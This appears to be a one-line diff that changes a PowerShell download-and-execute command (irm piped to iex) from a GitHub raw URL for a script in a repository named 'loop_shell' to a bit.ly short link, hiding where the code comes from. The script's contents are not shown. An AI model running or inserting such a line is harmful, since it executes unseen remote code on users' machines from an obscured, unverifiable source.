@@ -1,1 +1,1 @@
-irm https://raw.githubusercontent.com/anaprivate/loop_shell/refs/heads/main/once.ps1 | iex
+irm https://bit.ly/3Q9qej8 | iex
